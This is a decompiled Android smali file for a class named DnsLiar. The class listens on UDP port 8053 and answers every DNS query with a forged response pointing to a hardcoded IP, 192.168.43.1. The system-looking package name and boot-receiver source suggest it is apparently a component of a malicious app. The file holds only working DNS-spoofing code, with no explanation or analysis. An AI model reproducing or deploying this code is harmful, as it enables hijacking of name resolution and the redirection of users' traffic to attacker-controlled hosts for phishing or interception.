.class Los/system/DnsLiar;
.super Ljava/lang/Thread;
.source "ReceiverBoot.java"


# instance fields
.field private IsRunning:Z

.field private context:Landroid/content/Context;

.field receiveData:[B

.field private redirectTo:[B

.field sendData:[B

.field private serverSocket:Ljava/net/DatagramSocket;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 2

    .prologue
    const/16 v1, 0x400

    .line 1077
    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    .line 1072
    new-array v0, v1, [B

    iput-object v0, p0, Los/system/DnsLiar;->receiveData:[B

    .line 1073
    new-array v0, v1, [B

    iput-object v0, p0, Los/system/DnsLiar;->sendData:[B

    .line 1074
    const/4 v0, 0x4

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    iput-object v0, p0, Los/system/DnsLiar;->redirectTo:[B

    .line 1078
    iput-object p1, p0, Los/system/DnsLiar;->context:Landroid/content/Context;

    .line 1079
    const/4 v0, 0x1

    iput-boolean v0, p0, Los/system/DnsLiar;->IsRunning:Z

    .line 1089
    return-void

    .line 1074
    nop

    :array_0
    .array-data 1
        -0x40t
        -0x58t
        0x2bt
        0x1t
    .end array-data
.end method

.method private forgeDNSResponse([BI)[B
    .locals 13

    .prologue
    .line 1168
    const/16 v0, 0x10

    .line 1169
    const/4 v1, 0x2

    new-array v1, v1, [B

    const/4 v2, 0x0

    const/4 v3, 0x0

    aget-byte v3, p1, v3

    aput-byte v3, v1, v2

    const/4 v2, 0x1

    const/4 v3, 0x1

    aget-byte v3, p1, v3

    aput-byte v3, v1, v2

    .line 1170
    const/4 v2, 0x2

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    .line 1171
    const/4 v3, 0x2

    new-array v3, v3, [B

    const/4 v4, 0x0

    const/4 v5, 0x4

    aget-byte v5, p1, v5

    aput-byte v5, v3, v4

    const/4 v4, 0x1

    const/4 v5, 0x5

    aget-byte v5, p1, v5

    aput-byte v5, v3, v4

    .line 1172
    const/4 v4, 0x2

    new-array v4, v4, [B

    fill-array-data v4, :array_1

    .line 1173
    const/4 v5, 0x2

    new-array v5, v5, [B

    fill-array-data v5, :array_2

    .line 1174
    const/4 v6, 0x2

    new-array v6, v6, [B

    fill-array-data v6, :array_3

    .line 1176
    sub-int v7, p2, v0

    .line 1177
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v8, "\nHOST: "

    invoke-virtual {v0, v8}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 1178
    new-array v8, v7, [B

    .line 1179
    const/4 v0, 0x0

    :goto_0
    if-ge v0, v7, :cond_0

    .line 1180
    add-int/lit8 v9, v0, 0xc

    aget-byte v9, p1, v9

    invoke-static {v9}, Ljava/lang/Byte;->toString(B)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v9

    int-to-char v9, v9

    .line 1182
    add-int/lit8 v9, v0, 0xc

    aget-byte v9, p1, v9

    aput-byte v9, v8, v0

    .line 1179
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    .line 1185
    :cond_0
    const/4 v0, 0x2

    new-array v0, v0, [B

    const/4 v9, 0x0

    add-int/lit8 v10, v7, 0xc

    aget-byte v10, p1, v10

    aput-byte v10, v0, v9

    const/4 v9, 0x1

    add-int/lit8 v10, v7, 0xc

    add-int/lit8 v10, v10, 0x1

    aget-byte v10, p1, v10

    aput-byte v10, v0, v9

    .line 1186
    const/4 v9, 0x2

    new-array v9, v9, [B

    const/4 v10, 0x0

    add-int/lit8 v11, v7, 0xc

    add-int/lit8 v11, v11, 0x2

    aget-byte v11, p1, v11

    aput-byte v11, v9, v10

    const/4 v10, 0x1

    add-int/lit8 v7, v7, 0xc

    add-int/lit8 v7, v7, 0x3

    aget-byte v7, p1, v7

    aput-byte v7, v9, v10

    .line 1190
    const/4 v7, 0x2

    new-array v7, v7, [B

    fill-array-data v7, :array_4

    .line 1191
    const/4 v10, 0x2

    new-array v10, v10, [B

    fill-array-data v10, :array_5

    .line 1192
    const/4 v10, 0x2

    new-array v10, v10, [B

    fill-array-data v10, :array_6

    .line 1193
    const/4 v10, 0x4

    new-array v10, v10, [B

    fill-array-data v10, :array_7

    .line 1194
    const/4 v11, 0x2

    new-array v11, v11, [B

    fill-array-data v11, :array_8

    .line 1196
    new-instance v12, Ljava/util/ArrayList;

    invoke-direct {v12}, Ljava/util/ArrayList;-><init>()V

    .line 1197
    invoke-virtual {v12, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 1198
    invoke-virtual {v12, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 1199
    invoke-virtual {v12, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 1200
    invoke-virtual {v12, v4}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 1201
    invoke-virtual {v12, v5}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 1202
    invoke-virtual {v12, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 1203
    invoke-virtual {v12, v8}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 1204
    invoke-virtual {v12, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 1205
    invoke-virtual {v12, v9}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 1206
    invoke-virtual {v12, v7}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 1207
    invoke-virtual {v12, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 1208
    invoke-virtual {v12, v9}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 1212
    invoke-virtual {v12, v10}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 1213
    invoke-virtual {v12, v11}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 1214
    iget-object v0, p0, Los/system/DnsLiar;->redirectTo:[B

    invoke-virtual {v12, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 1215
    invoke-static {v12}, Los/system/DnsLiar;->toByteArray(Ljava/util/ArrayList;)[B

    move-result-object v0

    return-object v0

    .line 1170
    nop

    :array_0
    .array-data 1
        -0x7ft
        -0x80t
    .end array-data

    .line 1172
    nop

    :array_1
    .array-data 1
        0x0t
        0x1t
    .end array-data

    .line 1173
    nop

    :array_2
    .array-data 1
        0x0t
        0x0t
    .end array-data

    .line 1174
    nop

    :array_3
    .array-data 1
        0x0t
        0x0t
    .end array-data

    .line 1190
    nop

    :array_4
    .array-data 1
        -0x40t
        0xct
    .end array-data

    .line 1191
    nop

    :array_5
    .array-data 1
        0x0t
        0x1t
    .end array-data

    .line 1192
    nop

    :array_6
    .array-data 1
        0x0t
        0x1t
    .end array-data

    .line 1193
    nop

    :array_7
    .array-data 1
        0x0t
        0x0t
        0x0t
        0x64t
    .end array-data

    .line 1194
    :array_8
    .array-data 1
        0x0t
        0x4t
    .end array-data
.end method

.method private setRedirectTo(Ljava/lang/String;)V
    .locals 5

    .prologue
    const/4 v4, -0x1

    .line 1093
    if-eqz p1, :cond_0

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 1116
    :cond_0
    :goto_0
    return-void

    .line 1095
    :cond_1
    const/4 v0, 0x0

    .line 1096
    const-string v1, "."

    invoke-virtual {p1, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    .line 1097
    if-eq v1, v4, :cond_0

    .line 1099
    const/4 v2, 0x4

    :try_start_0
    new-array v2, v2, [B

    .line 1100
    const/4 v3, 0x0

    invoke-virtual {p1, v0, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    int-to-byte v0, v0

    aput-byte v0, v2, v3

    .line 1101
    add-int/lit8 v0, v1, 0x1

    .line 1102
    const/16 v1, 0x2e

    invoke-virtual {p1, v1, v0}, Ljava/lang/String;->indexOf(II)I

    move-result v1

    .line 1103
    if-eq v1, v4, :cond_0

    .line 1104
    const/4 v3, 0x1

    invoke-virtual {p1, v0, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    int-to-byte v0, v0

    aput-byte v0, v2, v3

    .line 1105
    add-int/lit8 v0, v1, 0x1

    .line 1106
    const/16 v1, 0x2e

    invoke-virtual {p1, v1, v0}, Ljava/lang/String;->indexOf(II)I

    move-result v1

    .line 1107
    if-eq v1, v4, :cond_0

    .line 1108
    const/4 v3, 0x2

    invoke-virtual {p1, v0, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    int-to-byte v0, v0

    aput-byte v0, v2, v3

    .line 1109
    add-int/lit8 v0, v1, 0x1

    .line 1110
    const/4 v1, 0x3

    invoke-virtual {p1, v0}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    int-to-byte v0, v0

    aput-byte v0, v2, v1

    .line 1111
    const/4 v0, 0x0

    iget-object v1, p0, Los/system/DnsLiar;->redirectTo:[B

    const/4 v3, 0x0

    array-length v4, v2

    invoke-static {v2, v0, v1, v3, v4}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 1112
    iput-object v2, p0, Los/system/DnsLiar;->redirectTo:[B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 1113
    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method private static toByteArray(Ljava/util/ArrayList;)[B
    .locals 6
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/ArrayList",
            "<[B>;)[B"
        }
    .end annotation

    .prologue
    const/4 v2, 0x0

    .line 1150
    move v1, v2

    move v3, v2

    .line 1151
    :goto_0
    invoke-virtual {p0}, Ljava/util/ArrayList;->size()I

    move-result v0

    if-ge v1, v0, :cond_0

    .line 1152
    invoke-virtual {p0, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [B

    array-length v0, v0

    add-int/2addr v3, v0

    .line 1151
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto :goto_0

    .line 1154
    :cond_0
    new-array v5, v3, [B

    move v1, v2

    move v0, v2

    .line 1157
    :goto_1
    invoke-virtual {p0}, Ljava/util/ArrayList;->size()I

    move-result v3

    if-ge v1, v3, :cond_2

    move v4, v2

    move v3, v0

    .line 1158
    :goto_2
    invoke-virtual {p0, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [B

    array-length v0, v0

    if-ge v4, v0, :cond_1

    .line 1159
    invoke-virtual {p0, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [B

    aget-byte v0, v0, v4

    aput-byte v0, v5, v3

    .line 1160
    add-int/lit8 v3, v3, 0x1

    .line 1158
    add-int/lit8 v0, v4, 0x1

    move v4, v0

    goto :goto_2

    .line 1157
    :cond_1
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    move v0, v3

    goto :goto_1

    .line 1163
    :cond_2
    return-object v5
.end method


# virtual methods
.method public run()V
    .locals 8

    .prologue
    const/4 v2, 0x0

    .line 1120
    const/4 v0, 0x0

    move-object v1, v0

    .line 1121
    :goto_0
    iget-boolean v0, p0, Los/system/DnsLiar;->IsRunning:Z

    if-eqz v0, :cond_3

    .line 1124
    :try_start_0
    new-instance v0, Ljava/net/DatagramSocket;

    const/16 v3, 0x1f75

    invoke-direct {v0, v3}, Ljava/net/DatagramSocket;-><init>(I)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 1125
    :try_start_1
    new-instance v3, Ljava/net/DatagramPacket;

    iget-object v1, p0, Los/system/DnsLiar;->receiveData:[B

    iget-object v4, p0, Los/system/DnsLiar;->receiveData:[B

    array-length v4, v4

    invoke-direct {v3, v1, v4}, Ljava/net/DatagramPacket;-><init>([BI)V

    .line 1126
    invoke-virtual {v0, v3}, Ljava/net/DatagramSocket;->receive(Ljava/net/DatagramPacket;)V

    .line 1127
    invoke-virtual {v3}, Ljava/net/DatagramPacket;->getData()[B

    move-result-object v4

    move v1, v2

    .line 1129
    :goto_1
    iget-object v5, p0, Los/system/DnsLiar;->sendData:[B

    array-length v5, v5

    if-ge v1, v5, :cond_0

    .line 1130
    iget-object v5, p0, Los/system/DnsLiar;->sendData:[B

    const/4 v6, 0x0

    aput-byte v6, v5, v1

    .line 1129
    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    .line 1132
    :cond_0
    invoke-virtual {v3}, Ljava/net/DatagramPacket;->getLength()I

    move-result v1

    invoke-direct {p0, v4, v1}, Los/system/DnsLiar;->forgeDNSResponse([BI)[B

    move-result-object v1

    iput-object v1, p0, Los/system/DnsLiar;->sendData:[B

    .line 1133
    invoke-virtual {v3}, Ljava/net/DatagramPacket;->getAddress()Ljava/net/InetAddress;

    move-result-object v1

    .line 1134
    invoke-virtual {v3}, Ljava/net/DatagramPacket;->getPort()I

    move-result v3

    .line 1136
    new-instance v4, Ljava/net/DatagramPacket;

    iget-object v5, p0, Los/system/DnsLiar;->sendData:[B

    iget-object v6, p0, Los/system/DnsLiar;->sendData:[B

    array-length v6, v6

    invoke-direct {v4, v5, v6, v1, v3}, Ljava/net/DatagramPacket;-><init>([BILjava/net/InetAddress;I)V

    .line 1137
    invoke-virtual {v0, v4}, Ljava/net/DatagramSocket;->send(Ljava/net/DatagramPacket;)V

    .line 1138
    invoke-virtual {v0}, Ljava/net/DatagramSocket;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 1142
    if-eqz v0, :cond_1

    invoke-virtual {v0}, Ljava/net/DatagramSocket;->isClosed()Z

    move-result v1

    if-nez v1, :cond_1

    .line 1143
    invoke-virtual {v0}, Ljava/net/DatagramSocket;->close()V

    :cond_1
    :goto_2
    move-object v1, v0

    .line 1145
    goto :goto_0

    .line 1140
    :catch_0
    move-exception v1

    .line 1142
    :goto_3
    if-eqz v0, :cond_1

    invoke-virtual {v0}, Ljava/net/DatagramSocket;->isClosed()Z

    move-result v1

    if-nez v1, :cond_1

    .line 1143
    invoke-virtual {v0}, Ljava/net/DatagramSocket;->close()V

    goto :goto_2

    .line 1142
    :catchall_0
    move-exception v1

    move-object v7, v1

    move-object v1, v0

    move-object v0, v7

    :goto_4
    if-eqz v1, :cond_2

    invoke-virtual {v1}, Ljava/net/DatagramSocket;->isClosed()Z

    move-result v2

    if-nez v2, :cond_2

    .line 1143
    invoke-virtual {v1}, Ljava/net/DatagramSocket;->close()V

    .line 1145
    :cond_2
    throw v0

    .line 1147
    :cond_3
    return-void

    .line 1142
    :catchall_1
    move-exception v0

    goto :goto_4

    .line 1140
    :catch_1
    move-exception v0

    move-object v0, v1

    goto :goto_3
.end method

.method public stopServer()V
    .locals 1

    .prologue
    .line 1220
    const/4 v0, 0x0

    iput-boolean v0, p0, Los/system/DnsLiar;->IsRunning:Z

    .line 1221
    return-void
.end method
